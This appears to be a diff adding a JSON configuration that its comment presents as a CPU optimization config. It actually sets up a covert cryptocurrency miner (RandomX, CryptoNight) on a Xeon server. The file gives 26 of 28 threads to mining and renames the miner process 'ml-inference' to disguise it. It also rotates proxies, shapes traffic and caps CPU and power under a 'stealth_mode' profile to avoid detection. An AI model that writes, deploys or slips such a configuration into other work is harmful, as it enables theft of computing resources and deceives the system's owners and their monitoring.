@@ -1,0 +1,80 @@
+{
+  "_comment": "CPU-only optimization config (GPU sections removed).",
+  "system_profile": {
+    "hardware_id": "xeon_e5_2690_v4_cpu_only",
+    "optimization_level": "maximum_performance",
+    "stealth_priority": "high"
+  },
+  "cpu_specifications": {
+    "model": "Intel Xeon E5-2690 v4",
+    "architecture": "Broadwell-EP",
+    "cores": 14,
+    "threads": 28,
+    "base_frequency_ghz": 2.6,
+    "turbo_frequency_ghz": 3.5,
+    "cache_l3_mb": 35
+  },
+  "mining_optimization": {
+    "cpu_mining": {
+      "algorithm_preference": ["RandomX", "CryptoNight", "Argon2"],
+      "thread_allocation": 26,
+      "reserved_threads": 2,
+      "frequency_scaling": "conservative",
+      "cache_optimization": true,
+      "numa_awareness": true
+    }
+  },
+  "stealth_configurations": {
+    "process_masking": {
+      "cpu_process_name": "ml-inference",
+      "process_priority": "below_normal"
+    },
+    "thermal_management": {
+      "cpu_temp_limit": 75
+    },
+    "power_capping": {
+      "total_system_watts": 250,
+      "cpu_watts": 120,
+      "efficiency_mode": true
+    },
+    "network_profile": {
+      "bandwidth_limit_mbps": 100,
+      "connection_throttling": true,
+      "proxy_rotation": true,
+      "traffic_shaping": true
+    }
+  },
+  "performance_profiles": {
+    "stealth_mode": {
+      "cpu_usage_limit": 70,
+      "power_limit": 80,
+      "noise_level": "silent"
+    },
+    "balanced_mode": {
+      "cpu_usage_limit": 85,
+      "power_limit": 90,
+      "noise_level": "moderate"
+    },
+    "performance_mode": {
+      "cpu_usage_limit": 95,
+      "power_limit": 100,
+      "noise_level": "aggressive"
+    }
+  },
+  "monitoring_thresholds": {
+    "temperature_alerts": {
+      "cpu_warning": 70,
+      "cpu_critical": 80
+    },
+    "performance_metrics": {
+      "hashrate_deviation_threshold": 5,
+      "efficiency_threshold": 0.85,
+      "uptime_target": 99.5
+    },
+    "security_monitoring": {
+      "process_scan_interval": 300,
+      "network_anomaly_detection": true,
+      "resource_usage_profiling": true
+    }
+  }
+}
